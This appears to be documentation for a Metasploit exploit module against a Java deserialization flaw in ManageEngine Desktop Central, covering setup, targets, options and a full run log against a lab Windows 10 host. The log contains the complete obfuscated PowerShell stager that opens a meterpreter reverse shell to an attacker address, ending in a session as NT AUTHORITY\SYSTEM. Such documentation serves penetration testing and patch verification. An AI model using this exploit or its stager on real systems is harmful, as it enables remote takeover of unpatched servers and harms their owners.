## Vulnerable Application

### Description

This module exploits a Java deserialization vulnerability in the
`getChartImage()` method from the `FileStorage` class within ManageEngine
Desktop Central versions < 10.0.474. Tested against 10.0.465 x64.

Quoting the vendor's advisory on fixed versions:

> The short-term fix for the arbitrary file upload vulnerability was
> released in build 10.0.474 on January 20, 2020. In continuation of
> that, the complete fix for the remote code execution vulnerability is
> now available in build 10.0.479.

### Setup

1. Download a vulnerable installer (I used 10.0.465 x64)
2. Install the software in Windows (I used Windows 10)

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Targets

### 0

This executes a Windows command.

### 1

This uses a Windows dropper to execute code.

### 2

This uses a PowerShell stager to execute code.

## Options

### WfsDelay

If the target is slow to shell, increase this value. The default is 60
seconds, on a fresh install and calibrated to my test environment.

## Scenarios

### Desktop Central 10.0.465 x64 on Windows 10

```
msf5 > use exploit/windows/http/desktopcentral_deserialization
msf5 exploit(windows/http/desktopcentral_deserialization) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/http/desktopcentral_deserialization) > options

Module options (exploit/windows/http/desktopcentral_deserialization):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      8383             yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   PowerShell Stager


msf5 exploit(windows/http/desktopcentral_deserialization) > set rhosts 172.16.249.139
rhosts => 172.16.249.139
msf5 exploit(windows/http/desktopcentral_deserialization) > set lhost 172.16.249.1
lhost => 172.16.249.1
msf5 exploit(windows/http/desktopcentral_deserialization) > run

[*] Started reverse TCP handler on 172.16.249.1:4444
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable. Desktop Central 100465 is a vulnerable build.
[*] Executing PowerShell Stager for windows/x64/meterpreter/reverse_tcp
[*] Powershell command length: 2502
[*] Executing command: powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b=$env:windir+'\sysnative\WindowsPowerShell\v1.0\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAImual4CA7VWa2+bSBT9nEj5D6iyBCiOjV0nTSNV2gFDjGu7psSP2GutCAww8QAuDLFJt/9979iQptt0t11pERLzuM9zz8zFz2OXkSQWEuuy/Ub4fHJ8NHZSJxKk2pr6al4XarkiHx3Beu1+aAbCO0Faos2mm0QOiVdXV1qepjhmh3njGjOUZTi6owRnkiz8KcxCnOKzD3f32GXCZ6H2R+OaJncOLcUKzXFDLJyh2ON7g8R1eDgNe0MJk8Tffxfl5Vlr1dA/5Q7NJNEuMoajhkepKAtfZO7wpthgSRwSN02yxGeNGYlftxuTOHN8PAJrD3iIWZh4mShDFvCmmOVpLOzz4QYO25IIw3GauMjzUpxlYl1YctPL1eo3aVn6/ZjHjES4YcYMp8nGxukDcXHW6DmxR/FH7K9Ay2YpiYOVLIPYQ7LGUi3OKa0Lv2JGGuFthdrPKknPlUBqzFK5DoV8Ic9h4uUUHzTFFwI9FF+G50AAQO7LyfHJsV/RxX2rec/ZAqOj5X6MITppnGRkL/dOUOrCEPw4LEkLmNZu0hzLqydshVrkTOs/Vm9VslyyVzzC0nKaEG8FKmU9a87FoMvXf8zLLvZJjLtF7ETEragnvQQy9inep9ioxEYQlCSWG9jrYooDh3HYeK2/U9Mjwp501ZxQD6fIhUJlEBXUUP42mEMlJNGMhzgCiA5zIF/NB8LjSrokeVF553MQEjXqZFldGOdw4ty6YGOHYq8uoDgj5RbKWbIfil/DHeaUEdfJWGVuJVc4lv60JM5YmrtQNcj9xt5glziUQ1EXesTDamGToPIrvgiE5lAK5wAsPUAhYIUDYDPOhRRC5HWXGzZmZrShOAKR/ck3qBPAOS/JvueOE2BP/HuAFZkPzOVQVBg8Cw/qa9OE1YUpSRlcIBxWTqL/5P3ZzbGPQ0txWQipOh5LtWCc1LUd4nwsMdkjkDLI3kiTSHUyfNE53BHSq6ZOuufjbvKI4NGNj9ZUtSfThTn0+tQ2mX2rk8EkDE3SMgOYFxM9GDNl8/7mpte3uz2Udnehj8zM1HtqYbVU5PbIm2lfnUxAj2gD635nIk+Ngnlwq23NcTg3wZE2CMwAvqoZuqqyUAJVMbSBrYY6UVBgWz2r01qYzUuqkkfbtFFv9uTvyY/e6fTmuxs0GvZRaHzwjFbb2Ouvuf5ifT3o6vu5y+fWbaYTHfzoxq01DfFsulFnurGwphszON0G1nTQ7BihCusm2Q02dhOeVqv/EHuPQ3r5OIRwremiT/DCDHARIAsh+zam9t1WQ6rhpmr3HE2MCaytb8x4Z91thl5x22u+nQ4J3iTI0hEyKJzHCDnbbrM1S95b03Nroiu7YqLstvp9c6uT/nZdfifXFxdB0++Mm1PbjHtOqEK8Rb+zJv1T2AP6KLd+c8rx6+px8zGeU2estRJ612xNSPeNqpoE90dDl35SIWewcW7dJVrbDX2IyQwurWCexG1nDXZnAYLoID+os983QUfNKVlPTufcVn+rRP2dwuOM+pcQW7uMAbHYnDchPtTr2lp8bZvztocNtXnqvnvFGQuUrRV09IyKP+ohQyfNQocCRaE5VJeCkaRGed+PE8I1JOnwm7DGaYwpdFnow9XZQpQmLu83+9YAve7QgXhDnMDwdfvFkSw8Ccpf+1C1dHW1gDDhtO5QY4DjgIV1ZfdaUaCnKLuOAjn+fGJasikkMFTnHYnDcjBL92Zlfnpr6eye/M9glZdGCB/v38D6uvYPuz8FoFLfJ/zd6rcLvwTnr6c+cwgDURvuPYoPXfdlBEpmPPst4YWByvvlw/8rP+TsbAR/KyfHfwHyG93zwwoAAA==''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"
[*] Uploading serialized payload
[+] Successfully uploaded serialized payload
[*] Deserializing payload
[+] Successfully deserialized payload
[*] Sending stage (206403 bytes) to 172.16.249.139
[*] Meterpreter session 1 opened (172.16.249.1:4444 -> 172.16.249.139:50055) at 2020-03-12 16:51:07 -0500
[!] This exploit may require manual cleanup of '..\webapps\DesktopCentral\_chart\logger.zip' on the target

meterpreter >
[+] Deleted ..\webapps\DesktopCentral\_chart\logger.zip

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : MSEDGEWIN10
OS              : Windows 10 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter >
```
